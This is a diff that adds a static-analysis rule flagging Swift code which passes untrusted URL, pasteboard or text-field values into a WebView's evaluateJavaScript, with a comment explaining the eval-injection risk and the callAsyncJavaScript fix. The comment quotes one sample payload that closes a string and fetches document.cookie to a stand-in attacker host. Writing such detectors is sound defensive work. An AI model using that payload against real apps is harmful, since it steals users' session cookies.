@@ -1,0 +1,40 @@
+# rules: swift-webview-evaluates-untrusted-script
+# languages: swift
+# fixture: swift/CWE-95.swift
+# from: CWE-95 (Eval Injection), CWE-79, MASVS-PLATFORM-2
+#
+# `evaluateJavaScript` runs its argument as source text in the web view's
+# context, with everything the loaded page can reach: its cookies, its local
+# storage, its DOM. A value dropped into the middle of a quoted JavaScript
+# string closes the quote and keeps going, so a deep link carrying
+#
+#     ');fetch('https://attacker/'+document.cookie);('
+#
+# reads the session out of a page the app trusts. On a phone the attacker is
+# whoever can hand the app a URL, which is any other app and any web page.
+#
+# The fix is not escaping, and that is the part worth saying: quoting
+# JavaScript correctly from Swift is a job nobody gets right twice.
+# `callAsyncJavaScript(_:arguments:)` passes the values in a dictionary that
+# never becomes source text at all. It is the same shape as binding a SQL
+# parameter and it is safe for the same reason - the value is never parsed as
+# code, so there is nothing to escape.
+#
+# `callAsyncJavaScript` is not in the sink list, which is what makes the safe
+# spelling invisible to this rule by construction rather than by exclusion.
+# That is the cheapest kind of exclusion there is, and it is worth noticing
+# when a language hands you one.
+
+[ "$$$V.evaluateJavaScript($JS)", "$$$V.evaluateJavaScript($JS, $$$_)",
+  "$$$V.stringByEvaluatingJavaScript(from: $JS)" ] as $runs
+| [ "$$$U.lastPathComponent", "$$$U.pathComponents", "$$$U.absoluteString",
+    "$$$U.queryItems", "$$$U.fragment", "UIPasteboard.general.string",
+    "$$$F.text", "$$$M.body" ] as $untrusted
+| scan_ast("*.swift"; $runs + $untrusted) as $all
+| ( $all | of($runs) | focus("JS")
+    | reaching($all | of($untrusted); []) )
+| finding("swift-webview-evaluates-untrusted-script";
+    "this script is assembled from a value the caller of the app chose, and a "
+    + "quote in it ends the string and starts code; pass it through "
+    + "callAsyncJavaScript's arguments instead")
+| report
